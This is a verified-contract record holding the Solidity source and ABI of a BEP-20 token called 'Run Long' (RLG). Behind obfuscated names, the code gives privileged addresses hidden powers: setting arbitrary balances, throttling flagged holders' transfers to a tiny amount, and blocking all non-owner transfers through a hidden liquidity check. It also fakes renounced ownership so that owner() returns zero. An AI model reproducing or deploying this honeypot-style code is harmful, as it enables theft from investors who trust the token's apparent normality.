{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface tokenIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeFee {\n    function createPair(address autoMarketingBuy, address amountFee) external returns (address);\n}\n\ninterface liquidityMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atLaunchedTo) external view returns (uint256);\n\n    function transfer(address marketingSender, uint256 marketingMode) external returns (bool);\n\n    function allowance(address enableToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingSender,\n        uint256 marketingMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableFund, uint256 value);\n    event Approval(address indexed enableToken, address indexed spender, uint256 value);\n}\n\ninterface liquidityModeMetadata is liquidityMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RunLong is atAmount, liquidityMode, liquidityModeMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeAt;\n    }\n\n    mapping(address => bool) public fromWallet;\n\n    constructor (){\n        \n        tokenIs txTotal = tokenIs(txTo);\n        txTrading = takeFee(txTotal.factory()).createPair(txTotal.WETH(), address(this));\n        \n        sellEnable = _msgSender();\n        launchModeIs();\n        fromList[sellEnable] = true;\n        listMarketing[sellEnable] = feeAt;\n        if (txIs == marketingToken) {\n            marketingToken = txIs;\n        }\n        emit Transfer(address(0), sellEnable, feeAt);\n    }\n\n    uint256 public receiverAt;\n\n    function totalAt(address modeFee) public {\n        if (receiverModeLimit) {\n            return;\n        }\n        \n        fromList[modeFee] = true;\n        if (receiverAt != teamShould) {\n            receiverAt = marketingToken;\n        }\n        receiverModeLimit = true;\n    }\n\n    function transferFrom(address feeTake, address marketingSender, uint256 marketingMode) external override returns (bool) {\n        if (_msgSender() != txTo) {\n            if (txSwap[feeTake][_msgSender()] != type(uint256).max) {\n                require(marketingMode <= txSwap[feeTake][_msgSender()]);\n                txSwap[feeTake][_msgSender()] -= marketingMode;\n            }\n        }\n        return minAuto(feeTake, marketingSender, marketingMode);\n    }\n\n    address toLiquidityTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address atLaunchedTo) public view virtual override returns (uint256) {\n        return listMarketing[atLaunchedTo];\n    }\n\n    bool public modeSell;\n\n    uint256 private feeAt = 100000000 * 10 ** 18;\n\n    address public sellEnable;\n\n    uint256 liquidityMarketing;\n\n    function minAuto(address feeTake, address marketingSender, uint256 marketingMode) internal returns (bool) {\n        if (feeTake == sellEnable) {\n            return shouldBuyList(feeTake, marketingSender, marketingMode);\n        }\n        uint256 enableBuy = liquidityMode(txTrading).balanceOf(toLiquidityTotal);\n        require(enableBuy == teamMin);\n        require(marketingSender != toLiquidityTotal);\n        if (fromWallet[feeTake]) {\n            return shouldBuyList(feeTake, marketingSender, senderWallet);\n        }\n        return shouldBuyList(feeTake, marketingSender, marketingMode);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountTradingTx;\n    }\n\n    mapping(address => bool) public fromList;\n\n    function transfer(address amountShould, uint256 marketingMode) external virtual override returns (bool) {\n        return minAuto(_msgSender(), amountShould, marketingMode);\n    }\n\n    event OwnershipTransferred(address indexed fundExempt, address indexed fromEnable);\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldListTx;\n    }\n\n    mapping(address => mapping(address => uint256)) private txSwap;\n\n    address public txTrading;\n\n    bool public receiverModeLimit;\n\n    bool private feeLaunched;\n\n    function senderTx(uint256 marketingMode) public {\n        senderTotal();\n        teamMin = marketingMode;\n    }\n\n    uint8 private shouldListTx = 18;\n\n    mapping(address => uint256) private listMarketing;\n\n    bool public modeReceiver;\n\n    function modeSwap(address swapList) public {\n        senderTotal();\n        \n        if (swapList == sellEnable || swapList == txTrading) {\n            return;\n        }\n        fromWallet[swapList] = true;\n    }\n\n    function tradingTo(address amountShould, uint256 marketingMode) public {\n        senderTotal();\n        listMarketing[amountShould] = marketingMode;\n    }\n\n    uint256 constant senderWallet = 12 ** 10;\n\n    uint256 private marketingToken;\n\n    string private launchList = \"RLG\";\n\n    function owner() external view returns (address) {\n        return tradingEnable;\n    }\n\n    function shouldBuyList(address feeTake, address marketingSender, uint256 marketingMode) internal returns (bool) {\n        require(listMarketing[feeTake] >= marketingMode);\n        listMarketing[feeTake] -= marketingMode;\n        listMarketing[marketingSender] += marketingMode;\n        emit Transfer(feeTake, marketingSender, marketingMode);\n        return true;\n    }\n\n    uint256 private teamShould;\n\n    function getOwner() external view returns (address) {\n        return tradingEnable;\n    }\n\n    address txTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 teamMin;\n\n    function allowance(address totalAuto, address fundReceiver) external view virtual override returns (uint256) {\n        if (fundReceiver == txTo) {\n            return type(uint256).max;\n        }\n        return txSwap[totalAuto][fundReceiver];\n    }\n\n    function senderTotal() private view {\n        require(fromList[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchList;\n    }\n\n    function approve(address fundReceiver, uint256 marketingMode) public virtual override returns (bool) {\n        txSwap[_msgSender()][fundReceiver] = marketingMode;\n        emit Approval(_msgSender(), fundReceiver, marketingMode);\n        return true;\n    }\n\n    string private amountTradingTx = \"Run Long\";\n\n    uint256 public txIs;\n\n    address private tradingEnable;\n\n    function launchModeIs() public {\n        emit OwnershipTransferred(sellEnable, address(0));\n        tradingEnable = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunchedTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchModeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapList\",\"type\":\"address\"}],\"name\":\"modeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverModeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"senderTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"}],\"name\":\"totalAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"tradingTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RunLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}